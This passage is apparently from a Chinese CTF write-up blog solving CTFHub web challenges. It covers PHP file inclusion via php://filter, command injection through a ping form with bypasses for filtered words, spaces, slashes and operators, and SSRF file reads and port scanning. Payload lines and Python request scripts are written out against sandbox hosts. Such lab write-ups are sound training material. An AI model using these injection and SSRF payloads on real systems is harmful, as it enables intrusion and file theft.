<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag?&lt;br&gt;</span><br><span class="hljs-string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="读取源代码"><a class="markdownIt-Anchor" href="#读取源代码"></a> 读取源代码</h3>
<p>页面提示flag在<code>/flag</code>里。</p>
<p><code>php://input</code>失效了。</p>
<p>作者应该是在<code>php.ini</code>中关掉了<code>allow_url_fopen</code>和<code>allow_url_include</code>中的一个获得都关了233。</p>
<p><code>php://input</code>从本质上讲是从外界url中获取文本，所以需要这两个开关保持开启。</p>
<p>但是<code>php://filter</code>作用的对象是本地【一般我们用来都index.php嘛2333】，不需要开启这两个就可以生效。</p>
<p>遂用<code>php://filter/read=convert.base64-encode/resource=</code>来直接读取flag的内容。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-<span class="hljs-number">07841</span>d369bc23ed5.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/index.php?file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode<span class="hljs-regexp">/resource=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure>
<p>得到</p>
<p><img src="https://upyun.wuuconix.link/image-20210904231248214.png" srcset="/img/loading.gif" lazyload alt="得到base64加密后的flag" /></p>
<p>解码后得到flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210904231305923.png" srcset="/img/loading.gif" lazyload alt="base64解码" /></p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;php://&quot;</span> ) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="hljs-string">flag in &lt;code&gt;/flag&lt;/code&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="命令注入"><a class="markdownIt-Anchor" href="#命令注入"></a> 命令注入</h3>
<p>很常见的命令联合执行的题。</p>
<p>源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$_GET[&#x27;ip&#x27;]&#125;</span>&quot;</span>;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;CTFHub 命令注入-无过滤&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;CTFHub 命令注入-无过滤&lt;/h1&gt;<br>&lt;form action=<span class="hljs-string">&quot;#&quot;</span> method=<span class="hljs-string">&quot;GET&quot;</span>&gt;<br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;ip&quot;</span>&gt;IP : &lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> id=<span class="hljs-string">&quot;ip&quot;</span> name=<span class="hljs-string">&quot;ip&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Ping&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;hr&gt;<br>&lt;pre&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>) &#123;<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/pre&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>在文本框中输入完ip之后利用分号分割再加入其他命令，最后的<code>$cmd</code>就会长成这样</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> -c <span class="hljs-number">4</span> <span class="hljs-number">127.0.0.1</span>;ls<br></code></pre></td></tr></table></figure>
<p>然后调用<code>exec</code>进行执行系统函数的时候就会把两句命令一起执行了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210905224857275.png" srcset="/img/loading.gif" lazyload alt=";ls" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210905224959627.png" srcset="/img/loading.gif" lazyload alt="ctf?" /></p>
<p>cat那个命令后没有出来flag，在源代码中。</p>
<p><img src="https://upyun.wuuconix.link/image-20210905225148057.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<p>至于为什么不能直接在网页中看到大概是因为<code>&lt;?php</code>这种标签在html中的特定作用。</p>
<p>看了wp，了解到了可以这样，把文本进行一层base64加密，这样就能直接在网页里出来了。当然之后还需要手动解密。</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span>; cat flag | base64<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210905231110531.png" srcset="/img/loading.gif" lazyload alt="base64" /></p>
<h3 id="过滤cat"><a class="markdownIt-Anchor" href="#过滤cat"></a> 过滤cat</h3>
<p>部分源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/cat/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里注意一下php中的<code>preg_match_all</code>函数。它是用来匹配正则表达式的，并且将字符串中所有匹配的符合结果存在一个列表中。例子如下。</p>
<p><img src="https://upyun.wuuconix.link/image-20210907171134778.png" srcset="/img/loading.gif" lazyload alt="preg_match_all" /></p>
<p>然后我们发现题目中过滤了cat。首先我们看看flag在哪。ls一下就出来了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210907171235141.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>很久以前我看到的一个命令，就是<code>tac</code>。很显然这个命令就是<code>cat</code>反过来的单词。它的实际效果也和它的名字一致。貌似就是把文本的最后一行先打印，从下往上打印。效果如下。</p>
<p><img src="https://upyun.wuuconix.link/image-20210907171504435.png" srcset="/img/loading.gif" lazyload alt="tac" /></p>
<p>所以这里我们直接用tac来读flag就行啦2333。</p>
<p><img src="https://upyun.wuuconix.link/image-20210907171546867.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<h3 id="过滤空格-2"><a class="markdownIt-Anchor" href="#过滤空格-2"></a> 过滤空格</h3>
<p>部分源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>以下是绕过空格的部分方法。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt <br><span class="hljs-built_in">cat</span>&lt;flag.txt <br><span class="hljs-built_in">cat</span>&lt;&gt;flag.txt<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210907172403041.png" srcset="/img/loading.gif" lazyload alt="绕过空格的一些方法" /></p>
<p>在bash情况下都能实现，但是zsh下只有<code>&lt;</code>和<code>&lt;&gt;</code>成功了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210907172457282.png" srcset="/img/loading.gif" lazyload alt="zsh下的情况" /></p>
<p>估计在bash情况下<code>$&#123;IFS&#125;</code>和<code>$IFS$9</code>的值是一个空格。但是在zsh的情况是换行的原因。</p>
<h3 id="过滤目录分隔符"><a class="markdownIt-Anchor" href="#过滤目录分隔符"></a> 过滤目录分隔符</h3>
<p>部分源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/\//&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>flag在一个目录下边。但是过滤了<code>/</code>，那怎么办呢？先cd进去不就行了2333</p>
<p>payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1; <span class="hljs-built_in">cd</span> flag_is_here &amp;&amp; <span class="hljs-built_in">cat</span> flag_14385852030406.php<br></code></pre></td></tr></table></figure>
<h3 id="过滤运算符"><a class="markdownIt-Anchor" href="#过滤运算符"></a> 过滤运算符</h3>
<p>部分源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||\&amp;)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>它过滤了<code>&amp;</code>和<code>|</code>，但是我命令连接符号一直用的<code>;</code>呀2333。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span><span class="hljs-comment">;cat flag_15157229854259.php</span><br></code></pre></td></tr></table></figure>
<h3 id="综合过滤练习"><a class="markdownIt-Anchor" href="#综合过滤练习"></a> 综合过滤练习</h3>
<p>这个综合练习就非常狠了啊，过滤了一堆。</p>
<p>部分源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>但是大部分题目都知道了如何绕过，但是这个所有命令连接符<code>&amp; | ;</code>全部被过滤的情况我还是第一次见。</p>
<p>查询资料过后发现可以用换行符来绕过。（但是直接在Linux上貌似不能这样用，应该是php奇怪的特性</p>
<p>官方的wp说的是</p>
<p><img src="https://upyun.wuuconix.link/image-20210907185237961.png" srcset="/img/loading.gif" lazyload alt="官方wp" /></p>
<p>但其实这几个url编码其实就是<code>\n</code> <code>\r</code> 和<code>\n\r</code>。</p>
<p>以下为payload脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-built_in">id</span> = parse.quote(<span class="hljs-string">&quot;1\ncd$&#123;IFS&#125;fla*\ntac$&#123;IFS&#125;f*&quot;</span>)<br>burp0_url = <span class="hljs-string">f&quot;http://challenge-b57b1d23d9161cc7.sandbox.ctfhub.com:10800/?ip=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://challenge-b57b1d23d9161cc7.sandbox.ctfhub.com:10800/&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>respoonse = requests.get(burp0_url, headers=burp0_headers).text<br>soup = BeautifulSoup(respoonse, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.pre)<br></code></pre></td></tr></table></figure>
<p>哦对了，它还过滤了<code>flag</code>。可以用<code>cd fla*</code>来进入目录和用<code>tac f*</code>来读flag。</p>
<p>这里还用到了<code>BeautifulSoup</code>这个库来方便得观察response。</p>
<p>响应中有一堆无关信息，有用得信息在<code>&lt;pre&gt;</code>标签中。</p>
<p><img src="https://upyun.wuuconix.link/image-20210907185735812.png" srcset="/img/loading.gif" lazyload alt="pre标签" /></p>
<p>我们可以用<code>soup.pre</code>来将pre标签从响应中拿出来观察。十分方便。</p>
<p><img src="https://upyun.wuuconix.link/image-20210907185829226.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<h2 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h2>
<h3 id="内网访问"><a class="markdownIt-Anchor" href="#内网访问"></a> 内网访问</h3>
<p>提示内网的flag.php。url中有url参数。填入即可。</p>
<p><img src="https://upyun.wuuconix.link/image-20210908100912005.png" srcset="/img/loading.gif" lazyload alt="题干" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210908100959062.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<p>看了一下别人的wp。发现更好的填法应该是<code>?url=http://127.0.0.1/flag.php</code>。</p>
<h3 id="伪协议读取文件"><a class="markdownIt-Anchor" href="#伪协议读取文件"></a> 伪协议读取文件</h3>
<p>直接上http协议的话没有看到flag。估计flag藏在php的注释中，无法直接看到。</p>
<p><img src="https://upyun.wuuconix.link/image-20210908102120976.png" srcset="/img/loading.gif" lazyload alt="直接http" /></p>
<p>可以用file协议来读文件。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-b5191e365b757889.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210908101904465.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
<p>这道题提示flag在8000-9000端口中。</p>
<p>一开始用Burp直接爆破 端口。但是貌似由于请求速度过快，导致一些页面返回503，从而无法得到正确答案，但是我也不知道这个怎么设置2333。我的这个Burp版本和网上的也不太一样 。</p>
<p><img src="https://upyun.wuuconix.link/image-20210908104845140.png" srcset="/img/loading.gif" lazyload alt="image-20210908104845140" /></p>
<p>然后我就用python写脚本试端口。一开始用的代码时burp上直接转化出来的，它有一个特点就是get没有<code>params</code>值，最后也没有正确得到结果。</p>
<p><img src="https://upyun.wuuconix.link/image-20210908105033708.png" srcset="/img/loading.gif" lazyload alt="Copy as requests" /></p>
<p>最后还是自己改一下吧2333，加上了<code>params</code>参数。不能太迷信工具。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8000</span>, <span class="hljs-number">9000</span>):<br>    burp0_url = <span class="hljs-string">f&quot;http://challenge-85119fa5ff180354.sandbox.ctfhub.com:10800/&quot;</span><br>    param = &#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;http://127.0.0.1:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>&#125;<br>    response = requests.get(burp0_url, params=param).text<br>    <span class="hljs-keyword">if</span>(response == <span class="hljs-string">&quot;&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;port: <span class="hljs-subst">&#123;port&#125;</span> failed!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;port: <span class="hljs-subst">&#123;port&#125;</span> success!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>最后在8162端口找到了flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210908105200560.png" srcset="/img/loading.gif" lazyload alt="port 8162" /></p>
<h3 id="post请求"><a class="markdownIt-Anchor" href="#post请求"></a> POST请求</h3>
<p>dirsearch扫描后发现<code>flag.php</code>和<code>index.php</code>。</p>
<p><img src="https://upyun.wuuconix.link/image-20210909220059148.png" srcset="/img/loading.gif" lazyload alt="dir" /></p>
<p>它还是提供了url参数来供我们访问内网文件。我们可以分别利用http协议和file协议来查看文件。</p>
<p><img src="https://upyun.wuuconix.link/image-20210909220244039.png" srcset="/img/loading.gif" lazyload alt="flag.php 神秘key" /></p>
